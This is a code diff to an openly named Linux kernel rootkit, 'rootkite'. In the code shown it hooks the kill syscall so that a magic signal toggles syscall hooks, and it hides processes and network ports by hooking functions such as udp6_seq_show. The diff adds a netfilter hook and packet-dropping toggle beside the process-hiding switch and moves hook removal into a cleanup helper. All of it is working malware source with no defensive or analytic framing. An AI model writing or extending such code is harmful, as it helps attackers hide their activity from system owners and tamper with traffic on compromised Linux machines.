@@ -14,6 +14,7 @@
 #include "hide_process.h"
 #include "hide_ports.h"
 #include "files_hacks.h"
+#include "netfilter_kite.h"
 
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("rootkite");
@@ -105,6 +106,7 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
             printk(KERN_ERR "error hooking udp6_seq_show\n");
         }
+        switch_net_hook();
         switch_hide_process();
     }
     else if ((sig == 63) && (pid == 2)){
@@ -157,6 +159,7 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
             printk(KERN_ERR "error hooking udp6_seq_show\n");
         }
+        switch_net_hook();
         switch_hide_process();
     }
     else if ((sig == 63) && (pid == 2)){
@@ -167,6 +170,19 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
     return orig_kill(pid, sig);
 }
 #endif
+
+
+static void cleanup(void){
+    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
+    cleanup_lists();
+    misc_deregister(&controller); // deregister the device controller
+    if(hide_process_active == 1){
+        switch_hide_process();
+    }
+    if(packet_dropper == 1){
+        switch_net_hook();
+    }
+}
 
 
 static int __init mod_init(void){
@@ -180,12 +196,7 @@ static int __init mod_init(void){
 
 
 static void __exit mod_exit(void){
-    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
-    cleanup_lists();
-    misc_deregister(&controller); // deregister the device controller
-    if(hide_process_active == 1){
-        switch_hide_process();
-    }
+    cleanup();
     printk(KERN_INFO "rootkite: exit\n");
 }
 
